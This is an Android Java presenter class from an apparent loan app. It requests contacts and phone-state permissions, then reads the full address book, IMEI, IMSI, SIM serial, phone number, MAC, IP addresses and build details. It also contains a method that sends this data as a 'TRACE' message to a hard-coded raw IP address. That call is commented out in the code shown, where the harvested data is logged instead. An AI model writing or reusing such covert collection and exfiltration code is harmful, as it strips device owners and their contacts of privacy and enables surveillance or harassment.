package com.daunkredit.program.sulu.view.presenter;

import android.Manifest;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.ServiceConnection;
import android.database.Cursor;
import android.os.Build;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.CellIdentityCdma;
import android.telephony.CellInfo;
import android.telephony.CellInfoCdma;
import android.telephony.CellSignalStrengthCdma;
import android.telephony.TelephonyManager;
import android.telephony.cdma.CdmaCellLocation;
import android.telephony.gsm.GsmCellLocation;

import com.blankj.androidutilcode.service.DeviceUuidFactory;
import com.blankj.androidutilcode.service.LocationService;
import com.blankj.utilcode.utils.DeviceUtils;
import com.blankj.utilcode.utils.NetworkUtils;
import com.blankj.utilcode.utils.Utils;
import com.sulu.harvester.message.IncomeMessageProto;
import com.daunkredit.program.sulu.app.ToastManager;
import com.daunkredit.program.sulu.app.base.presenter.BaseActivityPresenterImpl;
import com.orhanobut.logger.Logger;
import com.tbruyelle.rxpermissions.RxPermissions;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.List;

import io.netty.bootstrap.Bootstrap;
import io.netty.channel.Channel;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInboundHandlerAdapter;
import io.netty.channel.ChannelInitializer;
import io.netty.channel.ChannelOption;
import io.netty.channel.EventLoopGroup;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.codec.protobuf.ProtobufDecoder;
import io.netty.handler.codec.protobuf.ProtobufEncoder;
import io.netty.handler.codec.protobuf.ProtobufVarint32FrameDecoder;
import io.netty.handler.codec.protobuf.ProtobufVarint32LengthFieldPrepender;
import pub.devrel.easypermissions.AppSettingsDialog;
import pub.devrel.easypermissions.EasyPermissions;
import rx.Subscriber;
import rx.functions.Func1;

/**
 * @作者:My
 * @创建日期: 2017/6/21 11:59
 * @描述:${TODO}
 * @更新者:${Author}$
 * @更新时间:${Date}$
 * @更新描述:${TODO}
 */

public class ContactActPreImp extends BaseActivityPresenterImpl implements ContactActPresenter {
    @Override
    public void requestPermission() {
        JSONObject json = new JSONObject();
        try {
            json.put("test", "test");
        } catch (JSONException e) {
            e.printStackTrace();
        }

        RxPermissions permissions = new RxPermissions(mView.getBaseActivity());
        permissions.request(
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.ACCESS_WIFI_STATE,
                Manifest.permission.ACCESS_NETWORK_STATE//,
                //                Manifest.permission.ACCESS_COARSE_LOCATION,
                //                Manifest.permission.ACCESS_FINE_LOCATION
        )
                .map(new Func1<Boolean, JSONObject>() {
                    @Override
                    public JSONObject call(Boolean granted) {

                        //                        if(granted){
                        //
                        //                        }else{
                        //
                        //                        }

                        JSONObject json = new JSONObject();
                        try {
                            json.put("build_info", getBuildInfo());
                            json.put("contact_info", getContactInfo());
                            json.put("phone_status_info", getPhoneStatusInfo());

                        } catch (JSONException e) {
                            Logger.d(e);
                        }

                        return json;
                    }
                })
                .compose(this.<JSONObject>applySchedulers())
                .subscribe(new Subscriber<JSONObject>() {
                    @Override
                    public void onCompleted() {

                    }

                    @Override
                    public void onError(Throwable e) {
                        //                        Logger.d("onError "+e.getClass().getCanonicalName());

                        if (e instanceof SecurityException) {
                            List<String> perms = new ArrayList<>();
                            perms.add(Manifest.permission.READ_CONTACTS);
                            if (!isAttached()) {
                                return;
                            }
                            if (EasyPermissions.somePermissionPermanentlyDenied(mView.getBaseActivity(), perms)) {
                                new AppSettingsDialog.Builder(mView.getBaseActivity()).build().show();
                            }
                        }
                    }

                    @Override
                    public void onNext(JSONObject json) {

                        Logger.d("onNext " + json);

                        //                        sendInfo(new DeviceUuidFactory(ContactActivity.this).getDeviceUuid().toString(), json);

                        //                        handleCell();

                        //                        bindService(new Intent(ContactActivity.this, LocationService.class), conn, Context.BIND_AUTO_CREATE);
                    }
                });
    }

    private JSONObject getPhoneStatusInfo() {
        TelephonyManager tm = (TelephonyManager) Utils.getContext()
                .getSystemService(Context.TELEPHONY_SERVICE);

        JSONObject json = new JSONObject();

        try {
            json.put("imei", tm.getDeviceId());
            json.put("imsi", tm.getSubscriberId());

            json.put("device_id", tm.getDeviceId());
            json.put("device_software_version", tm.getDeviceSoftwareVersion());
            json.put("line_number", tm.getLine1Number());

            json.put("network_country_iso", tm.getNetworkCountryIso());
            json.put("network_operator", tm.getNetworkOperator());
            json.put("network_operator_name", tm.getNetworkOperatorName());

            json.put("network_type", tm.getNetworkType());
            json.put("phone_type", tm.getPhoneType());
            json.put("sim_country_iso", tm.getSimCountryIso());

            json.put("sim_operator", tm.getSimOperator());
            json.put("sim_operator_name", tm.getSimOperatorName());
            json.put("sim_serial_number", tm.getSimSerialNumber());

            json.put("sim_state", tm.getSimState());
            json.put("subscriber_id", tm.getSubscriberId());
            json.put("void_mail_number", tm.getVoiceMailNumber());

            json.put("mac", DeviceUtils.getMacAddress());
            json.put("ipv4_ip", NetworkUtils.getIPAddress(true));
            json.put("ipv6_ip", NetworkUtils.getIPAddress(false));
            json.put("uuid", new DeviceUuidFactory(mView.getBaseActivity()).getDeviceUuid());

        } catch (JSONException e) {
            e.printStackTrace();
        }

        return json;

    }

    private JSONObject getBuildInfo() {

        JSONObject json = new JSONObject();

        try {
            json.put(Settings.Secure.ANDROID_ID, DeviceUtils.getAndroidID());
            json.put("uuid", new DeviceUuidFactory(mView.getBaseActivity()).getDeviceUuid().toString());

            Field[] fields = Build.class.getDeclaredFields();

            for (Field field : fields) {

                try {
                    field.setAccessible(true);
                    String key = field.getName();

                    if (key != null) {

                        if (key.equals("SUPPORTED_32_BIT_ABIS")
                                || key.equals("SUPPORTED_64_BIT_ABIS")
                                || key.equals("SUPPORTED_ABIS")) {

                            String[] strs = (String[]) field.get(null);

                            if (strs != null) {
                                JSONArray array = new JSONArray();
                                for (int i = 0; i < strs.length; i++) {
                                    array.put(i, strs[i]);
                                }

                                json.put(key, array);
                            }

                        } else {
                            json.put(field.getName(), field.get(null).toString());
                        }
                    }
                } catch (Exception e) {
                    Logger.e("field", e);
                }
            }

        } catch (JSONException e) {
            e.printStackTrace();
        }

        return json;
    }

    private void sendInfo(String imei, JSONObject json) {
        IncomeMessageProto.Message.Builder builder = IncomeMessageProto.Message.newBuilder();

        builder.setImei(getImei());
        //        builder.setMobile();
        builder.setCTimestamp(System.currentTimeMillis());
        builder.setType(IncomeMessageProto.Message.Type.TRACE);
        builder.setBody(json.toString());


        final IncomeMessageProto.Message message = builder.build();

        Logger.d("message:" + message.toString());

        EventLoopGroup group = new NioEventLoopGroup();
        Bootstrap b = new Bootstrap()
                .group(group)
                .channel(NioSocketChannel.class)
                .option(ChannelOption.TCP_NODELAY, true)
                .handler(new ChannelInitializer<SocketChannel>() {
                    @Override
                    protected void initChannel(SocketChannel ch) throws Exception {
                        ch.pipeline().addLast(new ProtobufVarint32FrameDecoder());
                        ch.pipeline().addLast(new ProtobufDecoder(IncomeMessageProto.Message.getDefaultInstance()));
                        ch.pipeline().addLast(new ProtobufVarint32LengthFieldPrepender());
                        ch.pipeline().addLast(new ProtobufEncoder());
                        ch.pipeline().addLast(new ProspectorClientHandler());
                    }
                });

        try {
            Channel channel = b.connect("52.221.217.59", 9696).sync().channel();
            channel.writeAndFlush(message).sync();
            Logger.d("after send and flush");

        } catch (InterruptedException e) {
            e.printStackTrace();
            Logger.d(e);
        } finally {
            //            if(channel.isOpen())
            //            {
            //                channel.close();
            //            }

        }


    }

    private JSONArray getContactInfo() {

        JSONArray contactArray = new JSONArray();
        //得到ContentResolver对象
        ContentResolver cr = mView.getBaseActivity().getContentResolver();
        //取得电话本中开始一项的光标
        Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

        //        Logger.d("count="+cursor.getCount());


        //向下移动光标
        while (cursor.moveToNext()) {

            JSONObject contact = new JSONObject();

            //取得电话号码
            String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
            Cursor phone = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null,
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + contactId,
                    null,
                    null);

            String name = cursor.getString(cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));

            JSONArray phones = new JSONArray();

            while (phone.moveToNext()) {
                String number = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                //格式化手机号
                number = number.replace("-", "");
                number = number.replace(" ", "");

                phones.put(number);
            }

            try {
                contact.put("name", name);
                contact.put("phones", phones);
                contactArray.put(contact);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        Logger.d(contactArray);

        return contactArray;
    }

    private String getImei() {
        TelephonyManager tm = (TelephonyManager) Utils.getContext().getSystemService(Context.TELEPHONY_SERVICE);

        String imei = tm.getDeviceId();
        String imsi = tm.getSubscriberId();
        String androidId = Settings.Secure.getString(mView.getBaseActivity().getContentResolver(), Settings.Secure.ANDROID_ID);
        String uuid = new DeviceUuidFactory(mView.getBaseActivity()).getDeviceUuid().toString();

        return imei + "_" + imsi + "_" + androidId + "_" + uuid;
    }

    static class ProspectorClientHandler extends ChannelInboundHandlerAdapter {

        @Override
        public void channelActive(final ChannelHandlerContext ctx) throws Exception {
            Logger.d("Client active ");
        }

        @Override
        public void channelInactive(ChannelHandlerContext ctx) throws Exception {
            Logger.d("Client inactive ");
        }

        @Override
        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {
            Logger.d("userEventTriggered " + evt.getClass().getCanonicalName());
        }
    }

    private void handleCell() {
        final TelephonyManager tm = (TelephonyManager) Utils.getContext().getSystemService(Context.TELEPHONY_SERVICE);


        Logger.d("type=" + tm.getPhoneType());
        if (tm.getPhoneType() == TelephonyManager.PHONE_TYPE_CDMA) {
            CdmaCellLocation cdmaCellLocation = (CdmaCellLocation)
                    tm.getCellLocation();
            int cid = cdmaCellLocation.getBaseStationId(); //获取cdma基站识别标号 BID
            int lac = cdmaCellLocation.getNetworkId(); //获取cdma网络编号NID
            int sid = cdmaCellLocation.getSystemId(); //用谷歌API的话cdma网络的mnc要用这个getSystemId()取得→SID

            Logger.d("cid=" + cid + " lac=" + lac + " sic=" + sid);
        } else {
            GsmCellLocation gsmCellLocation = (GsmCellLocation) tm.getCellLocation();
            if (gsmCellLocation != null) {
                int cid = gsmCellLocation.getCid(); //获取gsm基站识别标号
                int lac = gsmCellLocation.getLac(); //获取gsm网络编号
                Logger.d("2 cid=" + cid + " lac=" + lac);
            }

        }

        List<CellInfo> infoLists = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.JELLY_BEAN_MR1) {
            infoLists = tm.getAllCellInfo();
            for (CellInfo info : infoLists) {
                CellInfoCdma cellInfoCdma = (CellInfoCdma) info;
                CellIdentityCdma cellIdentityCdma = cellInfoCdma.getCellIdentity();
                CellSignalStrengthCdma cellSignalStrengthCdma = cellInfoCdma.getCellSignalStrength();
                int strength = cellSignalStrengthCdma.getCdmaDbm();
                int cid = cellIdentityCdma.getBasestationId();

                Logger.d("strength=" + strength + " cid=" + cid);
                // 处理 strength和id数据
            }
        }


        //        tm.listen(new PhoneStateListener(){
        //            @Override
        //            public void onCellLocationChanged(CellLocation location){
        //                if(tm.getPhoneType() == TelephonyManager.PHONE_TYPE_CDMA){
        //                    CdmaCellLocation cdmaCellLocation = (CdmaCellLocation)
        //                            tm.getCellLocation();
        //                    int cid = cdmaCellLocation.getBaseStationId(); //获取cdma基站识别标号 BID
        //                    int lac = cdmaCellLocation.getNetworkId(); //获取cdma网络编号NID
        //                    int sid = cdmaCellLocation.getSystemId(); //用谷歌API的话cdma网络的mnc要用这个getSystemId()取得→SID
        //                }else{
        //                    GsmCellLocation gsmCellLocation = (GsmCellLocation) tm.getCellLocation();
        //                    int cid = gsmCellLocation.getCid(); //获取gsm基站识别标号
        //                    int lac = gsmCellLocation.getLac(); //获取gsm网络编号
        //                }
        //
        //                List<CellInfo> infoLists = null;
        //                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.JELLY_BEAN_MR1) {
        //                    infoLists = tm.getAllCellInfo();
        //                    for (CellInfo info : infoLists) {
        //                        CellInfoCdma cellInfoCdma = (CellInfoCdma) info;
        //                        CellIdentityCdma cellIdentityCdma = cellInfoCdma.getCellIdentity();
        //                        CellSignalStrengthCdma cellSignalStrengthCdma = cellInfoCdma.getCellSignalStrength();
        //                        int strength = cellSignalStrengthCdma.getCdmaDbm();
        //                        int cid = cellIdentityCdma.getBasestationId();
        //                        // 处理 strength和id数据
        //                    }
        //                }
        //
        //            }
        ////            @Override
        ////            public void onSignalStrengthsChanged(SignalStrength signalStrength) {
        ////
        ////            }
        //            @Override
        //            public void onCellInfoChanged(List<CellInfo> cellInfo) {
        //
        //            }
        //        }, PhoneStateListener.LISTEN_CELL_LOCATION);
    }

    private LocationService mLocationService;
    ServiceConnection conn = new ServiceConnection() {
        @Override
        public void onServiceDisconnected(ComponentName name) {
        }

        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mLocationService = ((LocationService.LocationBinder) service).getService();
            mLocationService.setOnGetLocationListener(new LocationService.OnGetLocationListener() {
                @Override
                public void getLocation(final String lastLatitude, final String lastLongitude, final String latitude, final String longitude, final String country, final String locality, final String street) {

                    String loc = "lastLatitude: " + lastLatitude +
                            "\nlastLongitude: " + lastLongitude +
                            "\nlatitude: " + latitude +
                            "\nlongitude: " + longitude +
                            "\ngetCountryName: " + country +
                            "\ngetLocality: " + locality +
                            "\ngetStreet: " + street;

                    Logger.d("loc=" + loc);

                    ToastManager.showToast(loc);
                }
            });
        }
    };
}
